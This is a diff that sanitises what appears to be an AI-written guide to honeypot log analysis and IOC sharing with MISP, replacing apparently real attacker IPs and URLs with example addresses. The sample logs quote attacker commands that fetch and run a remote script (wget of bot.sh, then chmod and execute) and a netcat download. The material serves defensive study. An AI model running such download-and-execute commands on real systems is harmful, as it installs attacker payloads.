@@ -14,7 +14,7 @@ Excellent question! Now that you've set up a **secure honeypot** (e.g., Cowrie f
 {
   "timestamp": "2025-04-05T10:23:45.123Z",
   "eventid": "cowrie.login.failed",
-  "src_ip": "45.136.245.102",
+  "src_ip": "198.51.100.23",
   "src_port": 55231,
   "username": "root",
   "password": "password123",
@@ -27,7 +27,7 @@ Excellent question! Now that you've set up a **secure honeypot** (e.g., Cowrie f
 {
   "timestamp": "2025-04-05T10:25:10.456Z",
   "eventid": "cowrie.login.success",
-  "src_ip": "45.136.245.102",
+  "src_ip": "198.51.100.23",
   "username": "root",
   "password": "toor",
   "session": "a1b2c3d4"
@@ -40,8 +40,8 @@ Excellent question! Now that you've set up a **secure honeypot** (e.g., Cowrie f
   "timestamp": "2025-04-05T10:25:15.789Z",
   "eventid": "cowrie.command.input",
   "session": "a1b2c3d4",
-  "src_ip": "45.136.245.102",
-  "input": "wget http://185.130.105.234/bot.sh -O /tmp/bot.sh"
+  "src_ip": "198.51.100.23",
+  "input": "wget http://malware.example/bot.sh -O /tmp/bot.sh"
 }
 ```
 
@@ -50,7 +50,7 @@ Excellent question! Now that you've set up a **secure honeypot** (e.g., Cowrie f
   "timestamp": "2025-04-05T10:25:18.001Z",
   "eventid": "cowrie.command.input",
   "session": "a1b2c3d4",
-  "src_ip": "45.136.245.102",
+  "src_ip": "198.51.100.23",
   "input": "chmod +x /tmp/bot.sh && /tmp/bot.sh"
 }
 ```
@@ -60,8 +60,8 @@ Excellent question! Now that you've set up a **secure honeypot** (e.g., Cowrie f
 {
   "timestamp": "2025-04-05T11:10:22.333Z",
   "eventid": "dionaea.download.complete",
-  "src_ip": "103.207.38.55",
-  "url": "http://103.207.38.55:8080/nc.exe",
+  "src_ip": "203.0.113.44",
+  "url": "http://download.example/nc.exe",
   "md5": "a1b2c3d4e5f67890a1b2c3d4e5f67890",
   "sha256": "f3a8b7c6d5e4f3a8b7c6d5e4f3a8b7c6d5e4f3a8b7c6d5e4f3a8b7c6d5e4f3a8"
 }
@@ -73,7 +73,7 @@ Excellent question! Now that you've set up a **secure honeypot** (e.g., Cowrie f
   "timestamp": "2025-04-05T10:26:01.222Z",
   "eventid": "cowrie.session.file_upload",
   "session": "a1b2c3d4",
-  "src_ip": "45.136.245.102",
+  "src_ip": "198.51.100.23",
   "filename": "scanner.py",
   "size": 4096,
   "sha256": "e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9b8c7d6f5e4a9"
@@ -119,9 +119,9 @@ From logs, extract:
 
 | IOC Type | Example |
 |--------|--------|
-| **IP Addresses** | `45.136.245.102` (brute force), `185.130.105.234` (malware host) |
+| **IP Addresses** | `198.51.100.23` (brute force), `203.0.113.44` (malware host) |
 | **Domains** | `malware.example.com` (from HTTP logs) |
-| **URLs** | `http://103.207.38.55:8080/nc.exe` |
+| **URLs** | `http://download.example/nc.exe` |
 | **File Hashes** | `sha256: f3a8b7c6...` (malware sample) |
 | **User-Agent Strings** | `python-requests/2.25.1` (automated scanner) |
 
@@ -181,7 +181,7 @@ Automate IOC sharing:
 ### Step 1: Extract IOCs from logs
 ```python
 import re
-log = "wget http://185.130.105.234/bot.sh"
+log = "wget http://malware.example/bot.sh"
 ips = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', log)
 urls = re.findall(r'(http[s]?://[^\s]+)', log)
 ```
@@ -193,8 +193,8 @@ from pymisp import PyMISP
 misp = PyMISP("https://your-misp.com", "your_api_key", ssl=False)
 
 event = misp.new_event(info="Honeypot Attack - 2025-04-05", distribution=1)
-misp.add_ipdst(event, "45.136.245.102", comment="SSH Brute Force")
-misp.add_url(event, "http://185.130.105.234/bot.sh")
+misp.add_ipdst(event, "198.51.100.23", comment="SSH Brute Force")
+misp.add_url(event, "http://malware.example/bot.sh")
 misp.add_hash(event, "f3a8b7c6...", category="Artifacts dropped")
 misp.update_event(event)
 ```
